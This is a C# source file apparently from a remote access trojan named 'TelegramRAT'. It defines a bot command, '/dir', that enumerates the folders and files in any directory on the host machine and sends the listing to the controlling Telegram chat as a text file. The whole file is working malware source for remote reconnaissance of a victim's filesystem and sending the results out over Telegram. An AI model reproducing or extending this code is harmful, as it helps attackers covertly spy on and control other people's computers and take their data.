using Telegram.Bot;
using System.Text;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class DirCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "dir";
    public override string Description => "Get all files and folders from specified directory. If no path is provided, shows current directory.";
    public override string Example => "/dir C:\\Program Files";
    public override int ArgsCount => -1;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var pathInput = model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty);
            var targetDirectoryInput = fileSystemService.SanitizePath(pathInput);
            
            string curdir = !string.IsNullOrWhiteSpace(targetDirectoryInput)
                ? targetDirectoryInput
                : fileSystemService.GetCurrentDirectory();

            if (!fileSystemService.DirectoryExists(curdir))
            {
                await notificationService.SendErrorAsync(model.Message, new DirectoryNotFoundException($"The directory \"{targetDirectoryInput}\" does not exist."));
                return;
            }

            var files = fileSystemService.EnumerateFiles(curdir);
            var dirs = fileSystemService.EnumerateDirectories(curdir);

            using MemoryStream ms = new MemoryStream();
            using StreamWriter sw = new StreamWriter(ms, Encoding.UTF8, 1024, leaveOpen: true);

            bool hasDirs = false;
            foreach (var dir in dirs)
            {
                if (!hasDirs)
                {
                    sw.WriteLine("Folders:");
                    sw.WriteLine();
                    hasDirs = true;
                }
                sw.WriteLine(fileSystemService.GetFileName(dir));
            }
            if (hasDirs) sw.WriteLine();

            bool hasFiles = false;
            foreach (var file in files)
            {
                if (!hasFiles)
                {
                    sw.WriteLine("Files:");
                    sw.WriteLine();
                    hasFiles = true;
                }
                sw.WriteLine(fileSystemService.GetFileName(file));
            }

            if (hasFiles || hasDirs)
            {
                await sw.FlushAsync();
                ms.Position = 0;

                await botClient.SendDocument(
                    chatId: model.Message.Chat.Id,
                    document: new Telegram.Bot.Types.InputFileStream(ms, "directory_contents.txt"),
                    caption: $"Contents of {curdir}",
                    replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
                );
            }
            else
            {
                await notificationService.SendInfoAsync(model.Message, "This directory contains no files and no folders.");
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
